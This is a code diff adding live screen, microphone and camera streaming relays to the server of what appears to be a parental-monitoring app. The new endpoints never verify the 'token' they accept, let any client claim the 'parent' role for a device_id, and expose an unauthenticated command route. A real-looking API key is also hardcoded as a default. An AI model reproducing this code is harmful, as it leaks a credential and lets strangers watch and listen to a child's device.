@@ -13,12 +13,12 @@ Deploy on Render.com:
 
 import os, uuid, json, base64, asyncio
 from datetime import datetime, timedelta
-from typing import Optional, List, Any
+from typing import Optional, List, Any, Dict, Set
 from pathlib import Path
 
 import uvicorn
 import httpx
-from fastapi import FastAPI, HTTPException, Header, Request, UploadFile, File, Form, Depends
+from fastapi import FastAPI, HTTPException, Header, Request, UploadFile, File, Form, Depends, WebSocket, WebSocketDisconnect
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse, FileResponse
 from fastapi.staticfiles import StaticFiles
@@ -36,6 +36,10 @@ JWT_EXPIRE_DAYS   = int(os.getenv("JWT_EXPIRE_DAYS", "30"))
 PORT              = int(os.getenv("PORT", "10000"))
 UPLOAD_DIR        = os.getenv("UPLOAD_DIR", "/tmp/imatoy_uploads")
 ALGORITHM         = "HS256"
+
+# Metered.ca TURN Server (WebRTC ke liye)
+METERED_API_KEY   = os.getenv("METERED_API_KEY", "zYgB3VGSmsAw470kDmr-yt4oyngLEyVXDT7d2mF97POUDiwr")
+METERED_DOMAIN    = os.getenv("METERED_DOMAIN",  "imatoy.metered.live")
 
 # Upload directories
 for d in ["media", "screenshots", "audio", "recordings"]:
@@ -742,6 +746,293 @@ async def get_stats(device_id: str):
         "location":       {"lat": info["location_lat"], "lng": info["location_lng"]}
                           if info and info.get("location_lat") else None,
     })
+
+# ═══════════════════════════════════════════════════════════════════
+# WEBSOCKET — LIVE STREAMING (Screen, Audio, Camera)
+# ═══════════════════════════════════════════════════════════════════
+# Architecture:
+#   Child App  → ws://server/ws/screen/{device_id}?role=child  (sends frames)
+#   Parent App → ws://server/ws/screen/{device_id}?role=parent (receives frames)
+#   Server relays data between child and parent(s)
+#
+# WebRTC Signaling:
+#   Child  → ws://server/ws/signal/{device_id}?role=child
+#   Parent → ws://server/ws/signal/{device_id}?role=parent
+#   Server relays offer/answer/ICE candidates
+
+class StreamConnectionManager:
+    """
+    Live streaming ke liye WebSocket connection manager.
+    Ek device_id ke liye ek child aur multiple parents ho sakte hain.
+    """
+    def __init__(self):
+        # {device_id: {"child": WebSocket|None, "parents": Set[WebSocket]}}
+        self.screen:  Dict[str, dict] = {}
+        self.audio:   Dict[str, dict] = {}
+        self.camera:  Dict[str, dict] = {}
+        self.signal:  Dict[str, dict] = {}
+
+    def _get_room(self, stream: str, device_id: str) -> dict:
+        store = getattr(self, stream)
+        if device_id not in store:
+            store[device_id] = {"child": None, "parents": set()}
+        return store[device_id]
+
+    async def connect(self, stream: str, device_id: str, ws: WebSocket, role: str):
+        await ws.accept()
+        room = self._get_room(stream, device_id)
+        if role == "child":
+            room["child"] = ws
+            print(f"📱 Child connected [{stream}] device={device_id[:8]}")
+        else:
+            room["parents"].add(ws)
+            print(f"👁️  Parent connected [{stream}] device={device_id[:8]} total_parents={len(room['parents'])}")
+
+    def disconnect(self, stream: str, device_id: str, ws: WebSocket, role: str):
+        store = getattr(self, stream)
+        if device_id not in store:
+            return
+        room = store[device_id]
+        if role == "child" and room["child"] == ws:
+            room["child"] = None
+            print(f"📱 Child disconnected [{stream}] device={device_id[:8]}")
+        else:
+            room["parents"].discard(ws)
+            print(f"👁️  Parent disconnected [{stream}] device={device_id[:8]}")
+
+    async def relay_to_parents(self, stream: str, device_id: str, data):
+        """Child se data lekar saare parents ko bhejo"""
+        store = getattr(self, stream)
+        if device_id not in store:
+            return
+        parents = store[device_id]["parents"].copy()
+        dead = set()
+        for parent in parents:
+            try:
+                if isinstance(data, bytes):
+                    await parent.send_bytes(data)
+                else:
+                    await parent.send_text(data if isinstance(data, str) else json.dumps(data))
+            except Exception:
+                dead.add(parent)
+        for ws in dead:
+            store[device_id]["parents"].discard(ws)
+
+    async def relay_to_child(self, stream: str, device_id: str, data):
+        """Parent se command lekar child ko bhejo"""
+        store = getattr(self, stream)
+        if device_id not in store:
+            return
+        child = store[device_id].get("child")
+        if child:
+            try:
+                if isinstance(data, bytes):
+                    await child.send_bytes(data)
+                else:
+                    await child.send_text(data if isinstance(data, str) else json.dumps(data))
+            except Exception:
+                store[device_id]["child"] = None
+
+    def get_status(self, stream: str, device_id: str) -> dict:
+        store = getattr(self, stream)
+        if device_id not in store:
+            return {"child_connected": False, "parent_count": 0}
+        room = store[device_id]
+        return {
+            "child_connected": room["child"] is not None,
+            "parent_count": len(room["parents"])
+        }
+
+ws_manager = StreamConnectionManager()
+
+# ─── WebSocket: Screen Streaming ────────────────────────────────────
+@app.websocket("/ws/screen/{device_id}")
+async def ws_screen(websocket: WebSocket, device_id: str, role: str = "child", token: str = None):
+    """
+    Screen streaming WebSocket.
+    Child: role=child → screenshot bytes bhejta hai
+    Parent: role=parent → screenshot bytes receive karta hai
+
+    Flutter mein use karo:
+      final channel = WebSocketChannel.connect(
+        Uri.parse('wss://appima.onrender.com/ws/screen/$deviceId?role=child&token=$token')
+      );
+      channel.sink.add(screenshotBytes);  // Uint8List
+    """
+    await ws_manager.connect("screen", device_id, websocket, role)
+    try:
+        while True:
+            if role == "child":
+                # Child screenshot bytes bhejta hai
+                data = await websocket.receive_bytes()
+                # Saare parents ko relay karo
+                await ws_manager.relay_to_parents("screen", device_id, data)
+            else:
+                # Parent commands bhej sakta hai (start/stop)
+                msg = await websocket.receive_text()
+                await ws_manager.relay_to_child("screen", device_id, msg)
+    except WebSocketDisconnect:
+        ws_manager.disconnect("screen", device_id, websocket, role)
+    except Exception as e:
+        print(f"Screen WS error [{device_id[:8]}]: {e}")
+        ws_manager.disconnect("screen", device_id, websocket, role)
+
+# ─── WebSocket: Audio Streaming ─────────────────────────────────────
+@app.websocket("/ws/audio/{device_id}")
+async def ws_audio(websocket: WebSocket, device_id: str, role: str = "child", token: str = None):
+    """
+    Audio streaming WebSocket.
+    Child: role=child → audio chunks (PCM/AAC bytes) bhejta hai
+    Parent: role=parent → audio chunks receive karta hai
+
+    Flutter mein use karo:
+      final channel = WebSocketChannel.connect(
+        Uri.parse('wss://appima.onrender.com/ws/audio/$deviceId?role=child&token=$token')
+      );
+      // Audio recorder se chunks lo aur bhejo
+      channel.sink.add(audioChunkBytes);
+    """
+    await ws_manager.connect("audio", device_id, websocket, role)
+    try:
+        while True:
+            if role == "child":
+                data = await websocket.receive_bytes()
+                await ws_manager.relay_to_parents("audio", device_id, data)
+            else:
+                msg = await websocket.receive_text()
+                await ws_manager.relay_to_child("audio", device_id, msg)
+    except WebSocketDisconnect:
+        ws_manager.disconnect("audio", device_id, websocket, role)
+    except Exception as e:
+        print(f"Audio WS error [{device_id[:8]}]: {e}")
+        ws_manager.disconnect("audio", device_id, websocket, role)
+
+# ─── WebSocket: Camera Streaming ────────────────────────────────────
+@app.websocket("/ws/camera/{device_id}")
+async def ws_camera(websocket: WebSocket, device_id: str, role: str = "child", token: str = None):
+    """
+    Camera streaming WebSocket.
+    Child: role=child → camera frame bytes (JPEG) bhejta hai
+    Parent: role=parent → camera frames receive karta hai
+
+    Flutter mein use karo:
+      final channel = WebSocketChannel.connect(
+        Uri.parse('wss://appima.onrender.com/ws/camera/$deviceId?role=child&token=$token')
+      );
+      channel.sink.add(jpegFrameBytes);
+    """
+    await ws_manager.connect("camera", device_id, websocket, role)
+    try:
+        while True:
+            if role == "child":
+                data = await websocket.receive_bytes()
+                await ws_manager.relay_to_parents("camera", device_id, data)
+            else:
+                # Parent camera switch command bhej sakta hai (front/back)
+                msg = await websocket.receive_text()
+                await ws_manager.relay_to_child("camera", device_id, msg)
+    except WebSocketDisconnect:
+        ws_manager.disconnect("camera", device_id, websocket, role)
+    except Exception as e:
+        print(f"Camera WS error [{device_id[:8]}]: {e}")
+        ws_manager.disconnect("camera", device_id, websocket, role)
+
+# ─── WebSocket: WebRTC Signaling ────────────────────────────────────
+@app.websocket("/ws/signal/{device_id}")
+async def ws_signal(websocket: WebSocket, device_id: str, role: str = "child"):
+    """
+    WebRTC Signaling WebSocket.
+    Offer/Answer/ICE candidates exchange ke liye.
+
+    Message format (JSON):
+      {"type": "offer",     "sdp": "..."}
+      {"type": "answer",    "sdp": "..."}
+      {"type": "ice",       "candidate": {...}}
+      {"type": "start",     "stream": "screen|audio|camera"}
+      {"type": "stop",      "stream": "screen|audio|camera"}
+
+    Flutter mein use karo:
+      final channel = WebSocketChannel.connect(
+        Uri.parse('wss://appima.onrender.com/ws/signal/$deviceId?role=child')
+      );
+      channel.sink.add(jsonEncode({"type": "offer", "sdp": sdpString}));
+    """
+    await ws_manager.connect("signal", device_id, websocket, role)
+    try:
+        while True:
+            msg = await websocket.receive_text()
+            if role == "child":
+                # Child ka offer/ICE → parent ko bhejo
+                await ws_manager.relay_to_parents("signal", device_id, msg)
+            else:
+                # Parent ka answer/ICE → child ko bhejo
+                await ws_manager.relay_to_child("signal", device_id, msg)
+    except WebSocketDisconnect:
+        ws_manager.disconnect("signal", device_id, websocket, role)
+    except Exception as e:
+        print(f"Signal WS error [{device_id[:8]}]: {e}")
+        ws_manager.disconnect("signal", device_id, websocket, role)
+
+# ─── REST: TURN Credentials (Metered.ca) ────────────────────────────
+@app.get("/api/turn/credentials")
+async def get_turn_credentials():
+    """
+    Metered.ca TURN server credentials fetch karo.
+    Flutter/Browser mein WebRTC ke liye use karo.
+    API key server pe safe rehti hai — client ko expose nahi hoti.
+
+    Response:
+    {
+      "iceServers": [
+        {"urls": "stun:imatoy.metered.live:80"},
+        {"urls": "turn:imatoy.metered.live:80", "username": "...", "credential": "..."},
+        ...
+      ]
+    }
+    """
+    try:
+        async with httpx.AsyncClient() as client:
+            r = await client.get(
+                f"https://{METERED_DOMAIN}/api/v1/turn/credentials",
+                params={"apiKey": METERED_API_KEY},
+                timeout=10
+            )
+            ice_servers = r.json()
+            return ok(data={"iceServers": ice_servers})
+    except Exception as e:
+        # Fallback: Google STUN server
+        return ok(data={
+            "iceServers": [
+                {"urls": "stun:stun.l.google.com:19302"},
+                {"urls": "stun:stun1.l.google.com:19302"},
+            ]
+        }, warning=str(e))
+
+# ─── REST: WebSocket Status ──────────────────────────────────────────
+@app.get("/api/ws/status/{device_id}")
+async def ws_status(device_id: str):
+    """Check karo ki device ka WebSocket connected hai ya nahi"""
+    return ok(data={
+        "deviceId": device_id,
+        "screen":  ws_manager.get_status("screen",  device_id),
+        "audio":   ws_manager.get_status("audio",   device_id),
+        "camera":  ws_manager.get_status("camera",  device_id),
+        "signal":  ws_manager.get_status("signal",  device_id),
+    })
+
+# ─── REST: Send Command via WebSocket ───────────────────────────────
+@app.post("/api/ws/command/{device_id}")
+async def ws_send_command(device_id: str, request: Request):
+    """
+    Parent dashboard se child ko WebSocket command bhejo.
+    Body: {"stream": "screen|audio|camera", "command": "start|stop|switch_camera"}
+    """
+    body = await request.json()
+    stream  = body.get("stream", "screen")
+    command = body.get("command", "start")
+    msg = json.dumps({"command": command, **{k: v for k, v in body.items() if k not in ["stream", "command"]}})
+    await ws_manager.relay_to_child(stream, device_id, msg)
+    return ok(message=f"Command '{command}' sent to device via {stream} WebSocket")
 
 # ═══════════════════════════════════════════════════════════════════
 # SERVE UPLOADED FILES
